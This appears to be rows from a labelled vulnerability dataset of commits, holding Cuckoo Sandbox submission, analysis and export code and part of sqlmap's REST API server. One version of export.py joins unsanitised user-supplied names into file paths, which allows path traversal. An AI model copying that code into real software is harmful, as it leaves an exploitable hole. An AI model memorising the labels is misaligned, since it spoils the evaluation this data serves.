    assert utils.parse_bool(True) is True
    assert utils.parse_bool(1) is True
    assert utils.parse_bool(2) is True
    assert utils.parse_bool(False) is False
    assert utils.parse_bool(0) is False

def test_supported_version():
    assert utils.supported_version(""2.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", None) is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.0"", ""2.0.0"", ""2.0.0"") is True

    assert utils.supported_version(""2.0.1a1"", ""2.0.0"", ""2.0.1"") is True
    assert utils.supported_version(""2.0.1a1"", ""2.0.1a0"", ""2.0.1b1"") is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1"", None) is False
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", None) is True
    assert utils.supported_version(""2.0.1b1"", ""2.0.1a1"", ""2.0.1"") is True

def test_validate_url():
    assert utils.validate_url(""http://google.com/"")
    assert utils.validate_url(""google.com"")
    assert utils.validate_url(""google.com/test"")
    assert utils.validate_url(""https://google.com/"")
    assert not utils.validate_url(""ftp://google.com/"")
/n/n/n",0
49,168cabf86730d56b7fa319278bf0f0034052666a,"/cuckoo/core/submit.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import copy
import logging
import os
import sflock

from cuckoo.common.config import emit_options
from cuckoo.common.exceptions import CuckooOperationalError
from cuckoo.common.files import Folders, Files, Storage
from cuckoo.common.utils import validate_url, validate_hash
from cuckoo.common.virustotal import VirusTotalAPI
from cuckoo.core.database import Database

log = logging.getLogger(__name__)

db = Database()

class SubmitManager(object):
    def _handle_string(self, submit, tmppath, line):
        if not line:
            return

        if validate_hash(line):
            try:
                filedata = VirusTotalAPI().hash_fetch(line)
            except CuckooOperationalError as e:
                submit[""errors""].append(
                    ""Error retrieving file hash: %s"" % e
                )
                return

            filepath = Files.create(tmppath, line, filedata)

            submit[""data""].append({
                ""type"": ""file"",
                ""data"": filepath
            })
            return

        if validate_url(line):
            submit[""data""].append({
                ""type"": ""url"",
                ""data"": line
            })
            return

        submit[""errors""].append(
            ""'%s' was neither a valid hash or url"" % line
        )

    def pre(self, submit_type, data):
        """"""
        The first step to submitting new analysis.
        @param submit_type: ""files"" or ""strings""
        @param data: a list of dicts containing ""name"" (file name)
                and ""data"" (file data) or a list of strings (urls or hashes)
        @return: submit id
        """"""
        if submit_type not in (""strings"", ""files""):
            log.error(""Bad parameter '%s' for submit_type"", submit_type)
            return False

        path_tmp = Folders.create_temp()
        submit_data = {
            ""data"": [],
            ""errors"": []
        }

        if submit_type == ""strings"":
            for line in data:
                self._handle_string(submit_data, path_tmp, line)

        if submit_type == ""files"":
            for entry in data:
                filename = Storage.get_filename_from_path(entry[""name""])
                filepath = Files.create(path_tmp, filename, entry[""data""])
                submit_data[""data""].append({
                    ""type"": ""file"",
                    ""data"": filepath
                })

        return Database().add_submit(path_tmp, submit_type, submit_data)

    def get_files(self, submit_id, password=None, astree=False):
        """"""
        Returns files from a submitted analysis.
        @param password: The password to unlock container archives with
        @param astree: sflock option; determines the format in which the files are returned
        @return: A tree of files
        """"""
        submit = Database().view_submit(submit_id)
        files, duplicates = [], []

        for data in submit.data[""data""]:
            if data[""type""] == ""file"":
                filename = Storage.get_filename_from_path(data[""data""])
                filepath = os.path.join(submit.tmp_path, data[""data""])
                filedata = open(filepath, ""rb"").read()

                unpacked = sflock.unpack(
                    filepath=filename, contents=filedata,
                    password=password, duplicates=duplicates
                )

                if astree:
                    unpacked = unpacked.astree()

                files.append(unpacked)
            elif data[""type""] == ""url"":
                files.append({
                    ""filename"": data[""data""],
                    ""filepath"": """",
                    ""relapath"": """",
                    ""selected"": True,
                    ""size"": 0,
                    ""type"": ""url"",
                    ""package"": ""ie"",
                    ""extrpath"": [],
                    ""duplicate"": False,
                    ""children"": [],
                    ""mime"": ""text/html"",
                    ""finger"": {
                        ""magic_human"": ""url"",
                        ""magic"": ""url""
                    }
                })
            else:
                raise RuntimeError(
                    ""Unknown data entry type: %s"" % data[""type""]
                )

        return {
            ""files"": files,
            ""path"": submit.tmp_path,
        }

    def translate_options(self, info, options):
        """"""Translates Web Interface options to Cuckoo database options.""""""
        ret = {}

        if not int(options[""simulated-human-interaction""]):
            ret[""human""] = int(options[""simulated-human-interaction""])

        return emit_options(ret)

    def submit(self, submit_id, config):
        """"""Reads, interprets, and converts the JSON configuration provided by
        the Web Interface into something we insert into the database.""""""
        ret = []
        submit = db.view_submit(submit_id)

        for entry in config[""file_selection""]:
            # Merge the global & per-file analysis options.
            info = copy.deepcopy(config[""global""])
            info.update(entry)
            options = copy.deepcopy(config[""global""][""options""])
            options.update(entry.get(""per_file_options"", {}))

            kw = {
                ""package"": info.get(""package""),
                ""timeout"": info.get(""timeout"", 120),
                ""priority"": info.get(""priority""),
                ""custom"": info.get(""custom""),
                ""owner"": info.get(""owner""),
                ""tags"": info.get(""tags""),
                ""memory"": info.get(""memory""),
                ""enforce_timeout"": options.get(""enforce-timeout""),
                ""machine"": info.get(""machine""),
                ""platform"": info.get(""platform""),
                ""options"": self.translate_options(info, options),
                ""submit_id"": submit_id,
            }

            if entry[""type""] == ""url"":
                ret.append(db.add_url(
                    url=info[""filename""], **kw
                ))
                continue

            # for each selected file entry, create a new temp. folder
            path_dest = Folders.create_temp()

            if not info[""extrpath""]:
                path = os.path.join(
                    submit.tmp_path, os.path.basename(info[""filename""])
                )

                filepath = Files.copy(path, path_dest=path_dest)

                ret.append(db.add_path(
                    file_path=filepath, **kw
                ))
            elif len(info[""extrpath""]) == 1:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                arc = sflock.zipify(sflock.unpack(
                    info[""arcname""], contents=open(arcpath, ""rb"").read()
                ))

                # Create a .zip archive out of this container.
                arcpath = Files.temp_named_put(
                    arc, os.path.basename(info[""arcname""])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))
            else:
                arcpath = os.path.join(
                    submit.tmp_path, os.path.basename(info[""arcname""])
                )
                if not os.path.exists(arcpath):
                    submit.data[""errors""].append(
                        ""Unable to find parent archive file: %s"" %
                        os.path.basename(info[""arcname""])
                    )
                    continue

                content = sflock.unpack(arcpath).read(info[""extrpath""][:-1])
                subarc = sflock.unpack(info[""extrpath""][-2], contents=content)

                # Write intermediate .zip archive file.
                arcpath = Files.temp_named_put(
                    sflock.zipify(subarc),
                    os.path.basename(info[""extrpath""][-2])
                )

                ret.append(db.add_archive(
                    file_path=arcpath, filename=info[""filename""], **kw
                ))

        return ret
/n/n/n/cuckoo/web/controllers/analysis/analysis.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import collections
import os
import pymongo

from django.http import Http404

from cuckoo.core.database import Database, TASK_PENDING
from cuckoo.common.mongo import mongo

db = Database()

class AnalysisController:
    @staticmethod
    def task_info(task_id):
        if not isinstance(task_id, int):
            raise Exception(""Task ID should be integer"")
        data = {}

        task = db.view_task(task_id, details=True)
        if task:
            entry = task.to_dict()
            entry[""guest""] = {}
            if task.guest:
                entry[""guest""] = task.guest.to_dict()

            entry[""errors""] = []
            for error in task.errors:
                entry[""errors""].append(error.message)

            entry[""sample""] = {}
            if task.sample_id:
                sample = db.view_sample(task.sample_id)
                entry[""sample""] = sample.to_dict()

            data[""task""] = entry
        else:
            return Exception(""Task not found"")

        return data

    @staticmethod
    def get_recent(limit=50, offset=0):
        db = Database()
        tasks_files = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""file"",
            not_status=TASK_PENDING)

        tasks_urls = db.list_tasks(
            limit=limit,
            offset=offset,
            category=""url"",
            not_status=TASK_PENDING)

        data = []
        if tasks_files:
            for task in tasks_files:
                new = task.to_dict()
                new[""sample""] = db.view_sample(new[""sample_id""]).to_dict()

                filename = os.path.basename(new[""target""])
                new.update({""filename"": filename})

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        if tasks_urls:
            for task in tasks_urls:
                new = task.to_dict()

                if db.view_errors(task.id):
                    new[""errors""] = True

                data.append(new)

        return data

    @staticmethod
    def get_report(task_id):
        report = AnalysisController._get_report(task_id)
        if not report:
            raise Http404(""the specified analysis does not exist"")

        data = {
            ""analysis"": report
        }

        dnsinfo = AnalysisController._get_dnsinfo(report)
        data.update(dnsinfo)
        return data

    @staticmethod
    def _get_report(task_id):
        return mongo.db.analysis.find_one({
            ""info.id"": int(task_id)
        }, sort=[(""_id"", pymongo.DESCENDING)])

    @staticmethod
    def get_reports(filters):
        cursor = mongo.db.analysis.find(
            filters, sort=[(""_id"", pymongo.DESCENDING)]
        )
        return [report for report in cursor]

    @staticmethod
    def _get_dnsinfo(report):
        """"""Create DNS information dicts by domain and ip""""""

        if ""network"" in report and ""domains"" in report[""network""]:
            domainlookups = dict((i[""domain""], i[""ip""]) for i in report[""network""][""domains""])
            iplookups = dict((i[""ip""], i[""domain""]) for i in report[""network""][""domains""])

            for i in report[""network""][""dns""]:
                for a in i[""answers""]:
                    iplookups[a[""data""]] = i[""request""]
        else:
            domainlookups = dict()
            iplookups = dict()

        return {
            ""domainlookups"": domainlookups,
            ""iplookups"": iplookups,
        }

    @staticmethod
    def get_behavior(task_id, report=None):
        """"""
        Returns behavioral information about an analysis
        sorted by category (files, registry, mutexes, etc)
        @param task_id: The analysis ID
        @param report: JSON analysis blob that is stored in MongoDB (results.json)
        @return: behavioral information as a dict
        """"""
        data = {}
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]
        procs = AnalysisController.behavior_get_processes(task_id, report)

        for proc in procs[""data""]:
            pid = proc[""pid""]
            pname = proc[""process_name""]
            pdetails = None
            for p in report[""behavior""][""generic""]:
                if p[""pid""] == pid:
                    pdetails = p
            if not pdetails:
                continue

            watchers = AnalysisController.behavior_get_watchers(
                task_id, pid=pid, report=report)

            for category, events in watchers.iteritems():
                if not data.has_key(category):
                    data[category] = {}
                if not data[category].has_key(pid):
                    data[category][pname] = {
                        ""pid"": pid,
                        ""process_name"": pname,
                        ""events"": {}
                    }

                for event in events:
                    if not data[category][pname][""events""].has_key(event):
                        data[category][pname][""events""][event] = []
                    for _event in pdetails[""summary""][event]:
                        data[category][pname][""events""][event].append(_event)

        return data

    @staticmethod
    def behavior_get_processes(task_id, report=None):
        if not task_id:
            raise Exception(""missing task_id"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        data = {
            ""data"": [],
            ""status"": True
        }

        for process in report.get(""behavior"", {}).get(""generic"", []):
            data[""data""].append({
                ""process_name"": process[""process_name""],
                ""pid"": process[""pid""]
            })

        # sort returning list of processes by their name
        data[""data""] = sorted(data[""data""], key=lambda k: k[""process_name""])

        return data

    @staticmethod
    def behavior_get_watchers(task_id, pid, report=None):
        if not task_id or not pid:
            raise Exception(""missing task_id or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""missing pid"")
        else:
            process = process[0]

        data = {}
        for category, watchers in AnalysisController.behavioral_mapping().iteritems():
            for watcher in watchers:
                if watcher in process[""summary""]:
                    if category not in data:
                        data[category] = [watcher]
                    else:
                        data[category].append(watcher)

        return data

    @staticmethod
    def behavior_get_watcher(task_id, pid, watcher, limit=None, offset=0, report=None):
        if not task_id or not watcher or not pid:
            raise Exception(""missing task_id, watcher, and/or pid"")
        if not report:
            report = AnalysisController.get_report(task_id)[""analysis""]

        behavior_generic = report[""behavior""][""generic""]
        process = [z for z in behavior_generic if z[""pid""] == pid]

        if not process:
            raise Exception(""supplied pid not found"")
        else:
            process = process[0]

        summary = process[""summary""]

        if watcher not in summary:
            raise Exception(""supplied watcher not found"")
        if offset:
            summary[watcher] = summary[watcher][offset:]
        if limit:
            summary[watcher] = summary[watcher][:limit]

        return summary[watcher]

    @staticmethod
    def behavioral_mapping():
        return {
            ""files"":
                [""file_opened"", ""file_read""],
            ""registry"":
                [""regkey_opened"", ""regkey_written"", ""regkey_read""],
            ""mutexes"":
                [""mutex""],
            ""directories"":
                [""directory_created"", ""directory_removed"", ""directory_enumerated""],
            ""processes"":
                [""command_line"", ""dll_loaded""],
        }

    @staticmethod
    def signatures(task_id, signatures=None):
        """"""Returns an OrderedDict containing a lists with signatures based on severity""""""
        if not task_id:
            raise Exception(""missing task_id"")
        if not signatures:
            signatures = AnalysisController.get_report(task_id)[""signatures""]

        data = collections.OrderedDict()
        for signature in signatures:
            severity = signature[""severity""]
            if severity > 3:
                severity = 3
            if not data.has_key(severity):
                data[severity] = []
            data[severity].append(signature)
        return data
/n/n/n/cuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        data = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""data"": data,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/n",1
50,b90267fe4e5ee266ec3d4310a7b5c92c805b7ea3,"cuckoo/web/controllers/analysis/export/export.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import io
import os
import json
import zipfile

from django.template.defaultfilters import filesizeformat

from cuckoo.common.utils import json_default
from cuckoo.web.controllers.analysis.analysis import AnalysisController
from cuckoo.web.utils import get_directory_size

class ExportController:
    """"""Class for creating task exports""""""
    @staticmethod
    def estimate_size(task_id, taken_dirs, taken_files):
        report = AnalysisController.get_report(task_id)
        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        size_total = 0

        for directory in taken_dirs:
            destination = ""%s/%s"" % (path, os.path.basename(directory))
            if os.path.isdir(destination):
                size_total += get_directory_size(destination)

        for filename in taken_files:
            destination = ""%s/%s"" % (path, os.path.basename(filename))
            if os.path.isfile(destination):
                size_total += os.path.getsize(destination)

        # estimate file size after zipping; 60% compression rate typically
        size_estimated = size_total / 6.5

        return {
            ""size"": int(size_estimated),
            ""size_human"": filesizeformat(size_estimated)
        }

    @staticmethod
    def create(task_id, taken_dirs, taken_files, report=None):
        """"""
        Returns a zip file as a file like object.
        :param task_id: task id
        :param taken_dirs: directories to include
        :param taken_files: files to include
        :param report: additional report dict
        :return: zip file
        """"""
        if not taken_dirs and not taken_files:
            raise Exception(
                ""Please select at least one directory or file to be exported.""
            )

        # @TO-DO: refactor
        taken_dirs_tmp = []
        for taken_dir in taken_dirs:
            if isinstance(taken_dir, tuple):
                taken_dirs_tmp.append(taken_dir[0])
            else:
                taken_dirs_tmp.append(taken_dir)

        taken_dirs = taken_dirs_tmp

        if not report:
            report = AnalysisController.get_report(task_id)

        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        f = io.BytesIO()
        z = zipfile.ZipFile(f, ""w"", zipfile.ZIP_DEFLATED, allowZip64=True)

        for dirpath, dirnames, filenames in os.walk(path):
            if os.path.basename(dirpath) == task_id:
                for filename in filenames:
                    if filename in taken_files:
                        z.write(os.path.join(dirpath, filename), filename)
            if os.path.basename(dirpath) in taken_dirs:
                for filename in filenames:
                    z.write(
                        os.path.join(dirpath, filename),
                        os.path.join(os.path.basename(dirpath), filename)
                    )

        # Creating an analysis.json file with additional information about this
        # analysis. This information serves as metadata when importing a task.
        obj = {
            ""action"": report.get(""debug"", {}).get(""action"", []),
            ""errors"": report.get(""debug"", {}).get(""errors"", []),
        }
        z.writestr(
            ""analysis.json"", json.dumps(obj, indent=4, default=json_default)
        )

        z.close()
        return f

    @staticmethod
    def get_files(analysis_path):
        """"""Locate all directories/results available for this analysis""""""
        if not os.path.exists(analysis_path):
            raise Exception(""Analysis path not found: %s"" % analysis_path)

        dirs, files = [], []
        for filename in os.listdir(analysis_path):
            path = os.path.join(analysis_path, filename)
            if os.path.isdir(path):
                dirs.append((filename, len(os.listdir(path))))
            else:
                files.append(filename)

        return dirs, files
/n/n/n",0
51,b90267fe4e5ee266ec3d4310a7b5c92c805b7ea3,"/cuckoo/web/controllers/analysis/export/export.py/n/n# Copyright (C) 2016-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import io
import os
import json
import zipfile

from django.template.defaultfilters import filesizeformat

from cuckoo.common.utils import json_default
from cuckoo.web.controllers.analysis.analysis import AnalysisController
from cuckoo.web.utils import get_directory_size

class ExportController:
    """"""Class for creating task exports""""""
    @staticmethod
    def estimate_size(task_id, taken_dirs, taken_files):
        report = AnalysisController.get_report(task_id)
        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        size_total = 0

        for directory in taken_dirs:
            destination = ""%s/%s"" % (path, directory)
            if os.path.isdir(destination):
                size_total += get_directory_size(destination)

        for filename in taken_files:
            destination = ""%s/%s"" % (path, filename)
            if os.path.isfile(destination):
                size_total += os.path.getsize(destination)

        # estimate file size after zipping; 60% compression rate typically
        size_estimated = size_total / 6.5

        return {
            ""size"": int(size_estimated),
            ""size_human"": filesizeformat(size_estimated)
        }

    @staticmethod
    def create(task_id, taken_dirs, taken_files, report=None):
        """"""
        Returns a zip file as a file like object.
        :param task_id: task id
        :param taken_dirs: directories to include
        :param taken_files: files to include
        :param report: additional report dict
        :return: zip file
        """"""
        if not taken_dirs and not taken_files:
            raise Exception(
                ""Please select at least one directory or file to be exported.""
            )

        # @TO-DO: refactor
        taken_dirs_tmp = []
        for taken_dir in taken_dirs:
            if isinstance(taken_dir, tuple):
                taken_dirs_tmp.append(taken_dir[0])
            else:
                taken_dirs_tmp.append(taken_dir)

        taken_dirs = taken_dirs_tmp

        if not report:
            report = AnalysisController.get_report(task_id)

        report = report[""analysis""]
        path = report[""info""][""analysis_path""]

        f = io.BytesIO()
        z = zipfile.ZipFile(f, ""w"", zipfile.ZIP_DEFLATED, allowZip64=True)

        for dirpath, dirnames, filenames in os.walk(path):
            if os.path.basename(dirpath) == task_id:
                for filename in filenames:
                    if filename in taken_files:
                        z.write(os.path.join(dirpath, filename), filename)
            if os.path.basename(dirpath) in taken_dirs:
                for filename in filenames:
                    z.write(
                        os.path.join(dirpath, filename),
                        os.path.join(os.path.basename(dirpath), filename)
                    )

        # Creating an analysis.json file with additional information about this
        # analysis. This information serves as metadata when importing a task.
        obj = {
            ""action"": report.get(""debug"", {}).get(""action"", []),
            ""errors"": report.get(""debug"", {}).get(""errors"", []),
        }
        z.writestr(
            ""analysis.json"", json.dumps(obj, indent=4, default=json_default)
        )

        z.close()
        return f

    @staticmethod
    def get_files(analysis_path):
        """"""Locate all directories/results available for this analysis""""""
        if not os.path.exists(analysis_path):
            raise Exception(""Analysis path not found: %s"" % analysis_path)

        dirs, files = [], []
        for filename in os.listdir(analysis_path):
            path = os.path.join(analysis_path, filename)
            if os.path.isdir(path):
                dirs.append((filename, len(os.listdir(path))))
            else:
                files.append(filename)

        return dirs, files
/n/n/n",1
52,b4bb4c393b26072b9a47f787be134888b983af60,"lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

